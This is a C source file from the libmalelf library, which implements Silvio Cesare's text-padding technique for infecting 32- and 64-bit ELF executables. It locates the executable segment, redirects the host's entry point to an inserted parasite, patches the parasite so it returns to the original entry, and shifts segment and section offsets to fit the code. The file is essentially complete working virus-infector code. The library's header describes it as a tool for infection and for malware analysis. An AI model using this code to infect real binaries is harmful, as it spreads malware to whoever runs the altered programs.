/*
 * The libmalelf is an evil library that could be used for good! It was
 * developed with the intent to assist in the process of infecting
 * binaries and provide a safe way to analyze malwares.
 *
 * Evil using this library is the responsibility of the programmer.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
 * implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <assert.h>

#include <malelf/defines.h>
#include <malelf/types.h>
#include <malelf/infect.h>
#include <malelf/util.h>
#include <malelf/error.h>
#include <malelf/binary.h>
#include <malelf/patch.h>
#include <malelf/debug.h>

typedef struct {
        MalelfBinary *host;
        MalelfBinary *parasite;
        _u32 host_entry_point;
        _u32 parasite_entry_point;
        _u32 infect_offset_at;
        _u32 parasite_vaddr;
        _u32 target_segment;
        _u32 offset_patch_parasite;
        _u32 magic_bytes;
} MalelfInfect;

static _u32 _malelf_infect_silvio_padding32(MalelfInfect *infector,
                                            MalelfBinary *output,
                                            Elf32_Phdr *target_phdr)
{
        _u32 error = MALELF_SUCCESS;
        _u32 end_of_text = 0;
        /*        _u32 last_chunk = 0;*/
        _u32 i;
        MalelfBinary *parasite = infector->parasite;
        MalelfBinary *input = infector->host;

        MALELF_DEBUG_INFO("Inserting parasite. Input binary '%s' "
                          "Output binary: '%s'",
                          input->fname,
                          output->fname);

        error = malelf_binary_copy_data(output,
                                       input,
                                       0,
                                       infector->infect_offset_at);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        if (infector->offset_patch_parasite == 0) {
                error = malelf_patch_at_magic_byte(parasite,
                                                   infector->magic_bytes,
                                                   infector->host_entry_point);
                if (MALELF_SUCCESS != error) {
                        return error;
                }
        } else {
                error = malelf_patch_at(parasite,
                                        infector->offset_patch_parasite,
                                        infector->host_entry_point);
                if (MALELF_SUCCESS != error) {
                        return error;
                }
        }

        error = malelf_binary_copy_data(output,
                                       parasite,
                                       0,
                                       parasite->size);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        for (i = 0; i < (MALELF_PAGE_SIZE - parasite->size); i++) {
                error = malelf_binary_add_byte(output,
                                               "\x00");
        }

        end_of_text = target_phdr->p_offset + target_phdr->p_filesz;

        /*        last_chunk = input->size - end_of_text;*/

        error = malelf_binary_copy_data(output,
                                       input,
                                       end_of_text,
                                       input->size);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        MALELF_DEBUG_INFO("Successfully infected. (%s)",
                          output->fname);
        return MALELF_SUCCESS;
}

static _u32 _malelf_infect_silvio_padding64(MalelfInfect *infector,
                                            MalelfBinary *output,
                                            Elf64_Phdr *target_phdr)
{
        _u32 error = MALELF_SUCCESS;
        _u32 end_of_text = 0;
        /*        _u32 last_chunk = 0;*/
        _u32 i;
        MalelfBinary *parasite = infector->parasite;
        MalelfBinary *input = infector->host;

        MALELF_DEBUG_INFO("Inserting parasite. Input binary '%s' "
                          "Output binary: '%s'",
                          input->fname,
                          output->fname);

        error = malelf_binary_copy_data(output,
                                       input,
                                       0,
                                       infector->infect_offset_at);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        if (infector->offset_patch_parasite == 0) {
                error = malelf_patch_at_magic_byte(parasite,
                                                   infector->magic_bytes,
                                                   infector->host_entry_point);
                if (MALELF_SUCCESS != error) {
                        return error;
                }
        } else {
                error = malelf_patch_at(parasite,
                                        infector->offset_patch_parasite,
                                        infector->host_entry_point);
                if (MALELF_SUCCESS != error) {
                        return error;
                }
        }

        error = malelf_binary_copy_data(output,
                                       parasite,
                                       0,
                                       parasite->size);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        for (i = 0; i < (MALELF_PAGE_SIZE - parasite->size); i++) {
                error = malelf_binary_add_byte(output,
                                               "\x00");
        }

        end_of_text = target_phdr->p_offset + target_phdr->p_filesz;

        /*        last_chunk = input->size - end_of_text;*/

        error = malelf_binary_copy_data(output,
                                       input,
                                       end_of_text,
                                       input->size);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        MALELF_DEBUG_INFO("Successfully infected. (%s)",
                          output->fname);
        return MALELF_SUCCESS;
}

_u32 _malelf_infect_prepare_silvio_padding32(MalelfInfect *infector)
{
        Elf32_Ehdr *host_ehdr;
        Elf32_Phdr *host_phdr, *phdr;
        MalelfBinary *host;
        _i32 text_found = -1;
        _u32 i = 0;

        assert (NULL != infector &&
                NULL != infector->host &&
                NULL != infector->parasite);

        host = infector->host;

        host_ehdr = (Elf32_Ehdr *) MALELF_ELF_DATA(&host->ehdr);
        host_phdr = (Elf32_Phdr *) MALELF_ELF_DATA(&host->phdr);

        for (phdr = host_phdr, i = host_ehdr->e_phnum;
             i-- > 0;
             phdr++) {
                if (text_found != -1) {
                        /* TODO: shift segments ... */
                        continue;
                } else if (phdr->p_type == PT_LOAD &&
                           phdr->p_flags == (PF_X | PF_R)) {
                        text_found = (host_ehdr->e_phnum - i) - 1;
                        infector->parasite_entry_point =
                                (phdr->p_vaddr + phdr->p_filesz);
                        infector->host_entry_point = host_ehdr->e_entry;
                        infector->infect_offset_at =
                                (phdr->p_offset + phdr->p_filesz);
                        infector->parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;
                }
        }

        if (text_found == -1) {
                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
                                   "'%s'.", host->fname);
                return MALELF_ETEXT_SEG_NOT_FOUND;
        }

        infector->target_segment = text_found;
        return MALELF_SUCCESS;
}

_u32 _malelf_infect_prepare_silvio_padding64(MalelfInfect *infector)
{
        Elf64_Ehdr *host_ehdr;
        Elf64_Phdr *host_phdr, *phdr;
        MalelfBinary *host;
        _i32 text_found = -1;
        _u32 i = 0;

        assert (NULL != infector &&
                NULL != infector->host &&
                NULL != infector->parasite);

        host = infector->host;

        host_ehdr = (Elf64_Ehdr *) MALELF_ELF_DATA(&host->ehdr);
        host_phdr = (Elf64_Phdr *) MALELF_ELF_DATA(&host->phdr);

        for (phdr = host_phdr, i = host_ehdr->e_phnum;
             i-- > 0;
             phdr++) {
                if (text_found != -1) {
                        /* TODO: shift segments ... */
                        continue;
                } else if (phdr->p_type == PT_LOAD &&
                           phdr->p_flags == (PF_X | PF_R)) {
                        text_found = (host_ehdr->e_phnum - i) - 1;
                        infector->parasite_entry_point =
                                (phdr->p_vaddr + phdr->p_filesz);
                        infector->host_entry_point = host_ehdr->e_entry;
                        infector->infect_offset_at =
                                (phdr->p_offset + phdr->p_filesz);
                        infector->parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;
                }
        }

        if (text_found == -1) {
                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
                                   "'%s'.", host->fname);
                return MALELF_ETEXT_SEG_NOT_FOUND;
        }

        infector->target_segment = text_found;
        return MALELF_SUCCESS;
}

_u32 malelf_infect_silvio_padding32(MalelfBinary *host,
                                    MalelfBinary *output,
                                    MalelfBinary *parasite,
                                    _u32 offset_entry_point,
                                    _u32 magic_bytes)
{
        _u32 i;
        _u32 error = MALELF_SUCCESS;
        MalelfInfect infector;
        Elf32_Ehdr *host_ehdr;
        Elf32_Phdr *host_phdr;
        Elf32_Shdr *host_shdr;
        Elf32_Phdr *target_phdr;
        Elf32_Phdr original_target_phdr;
        _u32 parasite_end_offset = 0;

        infector.host = host;
        infector.parasite = parasite;

        error = _malelf_infect_prepare_silvio_padding32(&infector);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        host_ehdr = host->ehdr.uhdr.h32;
        host_phdr = host->phdr.uhdr.h32;
        host_shdr = host->shdr.uhdr.h32;

        /* patch entry point */
        host_ehdr->e_entry = infector.parasite_entry_point;

        target_phdr = host_phdr + infector.target_segment;
        assert (target_phdr->p_type == PT_LOAD);
        assert (target_phdr->p_flags == (PF_X | PF_R));

        memcpy(&original_target_phdr, target_phdr, sizeof (Elf32_Phdr));

        target_phdr->p_filesz += (MALELF_PAGE_SIZE - parasite->size);
        target_phdr->p_memsz += (MALELF_PAGE_SIZE - parasite->size);

        /* shift every segment after TEXT segment */
        for (i = infector.target_segment + 1;
             i < host_ehdr->e_phnum;
             i++) {
                Elf32_Phdr *phdr = host_phdr + i;
                phdr->p_offset += MALELF_PAGE_SIZE;
        }

        parasite_end_offset = infector.infect_offset_at +
                parasite->size;

        /* Increase offset of every section after injection
         * by page size
         */
        for (i = host_ehdr->e_shnum; i-- > 0; host_shdr++) {
                if (host_shdr->sh_offset >= parasite_end_offset) {
                        host_shdr->sh_offset += MALELF_PAGE_SIZE;
                } else {
                        /* increase the size of section that contains
                           the parasite */
                        if (host_shdr->sh_size + host_shdr->sh_addr ==
                            infector.parasite_vaddr) {
                                host_shdr->sh_size += parasite->size;
                        }
                }

        }

        host_ehdr->e_shoff += MALELF_PAGE_SIZE;

        MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n",
                          target_phdr->p_vaddr);
        MALELF_DEBUG_INFO("Patched entry point from 0x%x to 0x%x\n",
                          infector.host_entry_point,
                          infector.parasite_entry_point);
        MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                          infector.infect_offset_at,
                          infector.parasite_vaddr);

        infector.offset_patch_parasite = offset_entry_point;
        infector.magic_bytes = magic_bytes;

        error = _malelf_infect_silvio_padding32(&infector,
                                                output,
                                                &original_target_phdr);


        return error;
}

_u32 malelf_infect_silvio_padding64(MalelfBinary *host,
                                    MalelfBinary *output,
                                    MalelfBinary *parasite,
                                    _u32 offset_entry_point,
                                    _u32 magic_bytes)
{
        _u32 i;
        _u32 error = MALELF_SUCCESS;
        MalelfInfect infector;
        Elf64_Ehdr *host_ehdr;
        Elf64_Phdr *host_phdr;
        Elf64_Shdr *host_shdr;
        Elf64_Phdr *target_phdr;
        Elf64_Phdr original_target_phdr;
        _u32 parasite_end_offset = 0;

        infector.host = host;
        infector.parasite = parasite;

        error = _malelf_infect_prepare_silvio_padding64(&infector);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        host_ehdr = host->ehdr.uhdr.h64;
        host_phdr = host->phdr.uhdr.h64;
        host_shdr = host->shdr.uhdr.h64;

        /* patch entry point */
        host_ehdr->e_entry = infector.parasite_entry_point;

        target_phdr = host_phdr + infector.target_segment;
        assert (target_phdr->p_type == PT_LOAD);
        assert (target_phdr->p_flags == (PF_X | PF_R));

        memcpy(&original_target_phdr, target_phdr, sizeof (Elf64_Phdr));

        target_phdr->p_filesz += (MALELF_PAGE_SIZE - parasite->size);
        target_phdr->p_memsz += (MALELF_PAGE_SIZE - parasite->size);

        /* shift every segment after TEXT segment */
        for (i = infector.target_segment + 1;
             i < host_ehdr->e_phnum;
             i++) {
                Elf64_Phdr *phdr = host_phdr + i;
                phdr->p_offset += MALELF_PAGE_SIZE;
        }

        parasite_end_offset = infector.infect_offset_at +
                parasite->size;

        /* Increase offset of every section after injection
         * by page size
         */
        for (i = host_ehdr->e_shnum; i-- > 0; host_shdr++) {
                if (host_shdr->sh_offset >= parasite_end_offset) {
                        host_shdr->sh_offset += MALELF_PAGE_SIZE;
                } else {
                        /* increase the size of section that contains
                           the parasite */
                        if (host_shdr->sh_size + host_shdr->sh_addr ==
                            infector.parasite_vaddr) {
                                host_shdr->sh_size += parasite->size;
                        }
                }

        }

        host_ehdr->e_shoff += MALELF_PAGE_SIZE;

        MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n",
                          target_phdr->p_vaddr);
        MALELF_DEBUG_INFO("Patched entry point from 0x%x to 0x%x\n",
                          infector.host_entry_point,
                          infector.parasite_entry_point);
        MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                          infector.infect_offset_at,
                          infector.parasite_vaddr);

        infector.offset_patch_parasite = offset_entry_point;
        infector.magic_bytes = magic_bytes;

        error = _malelf_infect_silvio_padding64(&infector,
                                                output,
                                                &original_target_phdr);


        return error;
}

/**
 * Try to infect the ELF using the text padding technique created
 * by Silvio Cesare.
 * More information:
 * http://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
 */
_u8 malelf_infect_silvio_padding(MalelfBinary* input,
                                 MalelfBinary* output,
                                 MalelfBinary* parasite,
                                 _u32 offset_entry_point,
                                 _u32 magic_bytes)
{
        switch (input->class) {
        case MALELF_ELF32:
                return malelf_infect_silvio_padding32(input,
                                                      output,
                                                      parasite,
                                                      offset_entry_point,
                                                      magic_bytes);
        case MALELF_ELF64:
                return malelf_infect_silvio_padding64(input,
                                                      output,
                                                      parasite,
                                                      offset_entry_point,
                                                      magic_bytes);
        }

        return MALELF_ERROR;
}
